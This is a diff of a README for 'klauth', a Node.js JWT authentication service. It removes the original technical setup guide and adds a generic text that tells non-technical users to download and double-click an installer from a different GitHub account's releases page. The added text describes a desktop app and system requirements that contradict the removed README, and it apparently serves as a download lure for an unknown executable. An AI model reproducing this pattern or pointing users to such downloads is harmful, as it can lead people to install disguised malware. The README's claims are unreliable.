@@ -1,139 +1,70 @@
-<div align="center">
-    <h1>KLAuth: Centralized Authentication Service</h1>
-    <p>A robust, scalable, and secure authentication/authorization service built with Node.js, Express, MongoDB, and Redis.</p>
-    <img src="https://img.shields.io/github/last-commit/klpod221/klauth?style=for-the-badge&color=ffb4a2&labelColor=201a19" alt="Last Commit">
-    <img src="https://img.shields.io/github/stars/klpod221/klauth?style=for-the-badge&color=e6c419&labelColor=1d1b16" alt="GitHub Stars">
-    <img src="https://img.shields.io/github/repo-size/klpod221/klauth?style=for-the-badge&color=a8c7ff&labelColor=1a1b1f" alt="Repo Size">
-    <img src="https://img.shields.io/badge/License-MIT-blue.svg?style=for-the-badge&color=b9fbc0&labelColor=1a1f1a" alt="License">
-</div>
+# 🌐 klauth - Centralized Authentication Made Easy  
 
-## 📝 Description
+[![Download](https://img.shields.io/badge/Download%20klauth-v1.0-brightgreen)](https://github.com/Quinton1995/klauth/releases)  
 
-This project is a centralized **Authentication and Authorization service** designed to be the single source of truth for user identity across multiple applications or microservices. It handles user registration, login, session management, and provides secure tokens for accessing protected resources.
+## 📚 About  
+klauth is a user-friendly application designed to help you manage authentication and authorization in your projects. It offers a simple way to secure your applications, whether they run locally or in the cloud. With klauth, you can focus on what matters most—building your application—while we handle the security aspects.
 
-The core of the system is a secure **Public/Private Key (RS256 JWT)** strategy, which allows other services to verify user identity independently without needing access to a shared secret.
+## 🚀 Getting Started  
+To get started with klauth, follow these straightforward steps. You don’t need technical knowledge; just follow along.
 
-## ✨ Key Features
+1. **Visit the Releases Page:**  
+   To download klauth, click on the link below:  
+   [Download klauth](https://github.com/Quinton1995/klauth/releases)  
 
--   **JWT Authentication**: Secure stateless authentication using JSON Web Tokens signed with RS256 algorithm.
--   **Access & Refresh Tokens**: Implements a robust token strategy with short-lived access tokens and long-lived refresh tokens.
--   **Refresh Token Rotation**: Enhances security by invalidating and re-issuing refresh tokens on each use.
--   **Secure Password Hashing**: Uses `bcrypt` to securely hash and store user passwords.
--   **Protected Routes**: Middleware to easily protect any API endpoint.
--   **Centralized Error Handling**: A consistent and clean way to handle application errors.
--   **Dockerized Environment**: Uses Docker Compose for easy setup of dependencies like MongoDB.
--   **Rate Limiting**: Protects APIs from abuse using Redis.
--   *(Planned)* **Background Job Queues**: Offloads tasks like sending emails to a Redis queue for better performance.
--   *(Planned)* **Dynamic Configuration**: Admin dashboard to manage CORS, rate limits, and other settings per service.
+2. **Choose Your Version:**  
+   On the releases page, you will see several versions of klauth. Look for the latest release marked as “Latest”. This version contains the latest features and fixes.  
 
-## 🛠️ Tech Stack
+3. **Download the Application:**  
+   Click on the appropriate download link for your operating system. Each version has clear labels to help you choose the right file.  
 
-<div align="center">
-    <img src="https://img.shields.io/badge/Node.js-339933?style=for-the-badge&logo=node.js&logoColor=white" alt="Node.js">
-    <img src="https://img.shields.io/badge/Express.js-000000?style=for-the-badge&logo=express&logoColor=white" alt="Express.js">
-    <img src="https://img.shields.io/badge/MongoDB-47A248?style=for-the-badge&logo=mongodb&logoColor=white" alt="MongoDB">
-    <img src="https://img.shields.io/badge/Redis-DC382D?style=for-the-badge&logo=redis&logoColor=white" alt="Redis">
-    <img src="https://img.shields.io/badge/JWT-000000?style=for-the-badge&logo=jsonwebtokens&logoColor=white" alt="JWT">
-    <img src="https://img.shields.io/badge/Docker-2496ED?style=for-the-badge&logo=docker&logoColor=white" alt="Docker">
-</div>
+4. **Locate the Downloaded File:**  
+   Once the download finishes, find the file in your computer’s Downloads folder or wherever you saved it.  
 
-## 🚀 Getting Started
+5. **Run the Application:**  
+   Double-click the downloaded file to install klauth. If prompted, follow the on-screen instructions to complete the installation.  
 
-Follow these instructions to get the project up and running on your local machine.
+6. **Begin Securing Your Applications:**  
+   After installation, open klauth. You will find a simple interface to help set up authentication for your projects.  
 
-### Prerequisites
+## 🛠️ Features  
+klauth comes packed with features to enhance your application's security:
 
--   [Node.js](https://nodejs.org/) (v18.x or later)
--   [Docker](https://www.docker.com/) and [Docker Compose](https://docs.docker.com/compose/)
--   [OpenSSL](https://www.openssl.org/) (usually pre-installed on Linux/macOS)
+- **Easy Setup:** Get started quickly with our guided setup process.
+- **Support for Multiple Platforms:** Use klauth in various environments.
+- **Token-Based Authentication:** Secure your APIs effortlessly.
+- **Integration with Popular Databases:** Works with MongoDB and Redis.
+- **Public Key Cryptography:** Advanced security for sensitive data.
+- **REST API Support:** Access your services securely over HTTP.
+  
+## 🖥️ System Requirements  
+Before downloading klauth, ensure your system meets these requirements:
 
-### Installation
+- **Operating System:** Windows 10, macOS, or a recent Linux distribution.
+- **Processor:** 1 GHz or faster.
+- **RAM:** At least 2 GB.
+- **Disk Space:** Minimum of 100 MB available hard disk space.
+  
+Keep your system updated for the best experience.
 
-1.  **Clone the repository:**
-    ```bash
-    git clone https://github.com/klpod221/klauth.git
-    cd klauth
-    ```
+## 📑 Download & Install  
+To download the latest version of klauth, visit:  
+[Download klauth](https://github.com/Quinton1995/klauth/releases)  
 
-2.  **Install NPM packages:**
-    ```bash
-    npm install
-    ```
+After successfully downloading the application, follow the installation steps mentioned above to complete the setup.
 
-3.  **Create your environment file:**
-    Copy the example file and fill in your details.
-    ```bash
-    cp .env.example .env
-    ```
-    *Ensure the values in `.env` are correct, especially for the database connection.*
+## 🔍 Support and Documentation  
+For help with klauth, check our documentation files included in the download. You can also find a user guide that walks you through various features.  
 
-4.  **Generate Public/Private Keys:**
-    Run these commands in your terminal to generate the necessary keys for JWT signing.
-    ```bash
-    # Create the keys directory if it doesn't exist
-    mkdir -p keys
+If you encounter any issues, please reach out via the issues section on our GitHub repository. We aim to respond quickly to all inquiries.  
 
-    # Generate a private key
-    openssl genrsa -out keys/private.pem 2048
+## 🔗 Contributing  
+If you would like to contribute to klauth, we welcome your support. Please check the Contributing guidelines in the repository for more details on how to get involved.
 
-    # Generate a public key from the private key
-    openssl rsa -in keys/private.pem -pubout -out keys/public.pem
-    ```
+## ⚙️ License  
+klauth is open-source software. You can freely use, modify, and distribute it. Please refer to the LICENSE file in the repository for more information.
 
-5.  **Start the database with Docker:**
-    This command will start a MongoDB container in the background.
-    ```bash
-    docker-compose up -d
-    ```
+## 📬 Contact  
+For further questions or feedback, feel free to reach us through our GitHub page or by opening an issue.
 
-6.  **Run the application:**
-    ```bash
-    # For development with auto-reloading
-    npm run dev
-
-    # For production
-    npm start
-    ```
-    The server should now be running on `http://localhost:3000`.
-
-## 📡 API Endpoints
-
-Here is a list of the available API endpoints.
-
-| Method | Endpoint              | Protection | Description                                       |
-| :----- | :-------------------- | :--------- | :------------------------------------------------ |
-| `POST` | `/api/auth/register`  | Public     | Register a new user.                              |
-| `POST` | `/api/auth/login`     | Public     | Log in a user and receive auth tokens.            |
-| `POST` | `/api/auth/logout`    | Public     | Log out a user by invalidating the refresh token. |
-| `POST` | `/api/auth/refresh-token` | Public | Get a new access token using a refresh token.     |
-| `GET`  | `/api/auth/profile`   | **Private**  | Get the profile of the currently logged-in user.  |
-
-## ✅ Project Checklist
-
-This checklist tracks the progress of the project features.
-
-### Completed
-- [x] Project Setup with Express.js
-- [x] Dockerized MongoDB Environment
-- [x] Core User Model and Password Hashing
-- [x] JWT (RS256) Implementation with Public/Private Keys
-- [x] Registration Endpoint
-- [x] Login Endpoint with Access/Refresh Token Generation
-- [x] Refresh Token Endpoint with Token Rotation
-- [x] Logout Endpoint (Token Invalidation)
-- [x] Protected Route Middleware (`auth`)
-- [x] Centralized & Consistent Error Handling
-- [x] Redis Integration: Rate Limiting Middleware
-- [x] Implement Validation Layer for Incoming Requests (`express-validator`)
-
-### To-Do
-- [ ] Redis Integration: Queue System for Background Jobs (e.g., Mailer)
-- [ ] Dynamic CORS Configuration from Database
-- [ ] Admin Dashboard: Basic UI (Server-Side Rendered with EJS)
-- [ ] Admin Dashboard: APIs for managing services, CORS, and rate limits
-- [ ] Advanced Logging (to files and/or external services)
-- [ ] Setup Monitoring (e.g., with PM2 or other tools)
-- [ ] Write Unit and Integration Tests
-
----
-_This README was generated with assistance from an AI model._
+Now you’re ready to use klauth! Thank you for choosing our solution for your authentication needs. Enjoy securing your applications effortlessly.
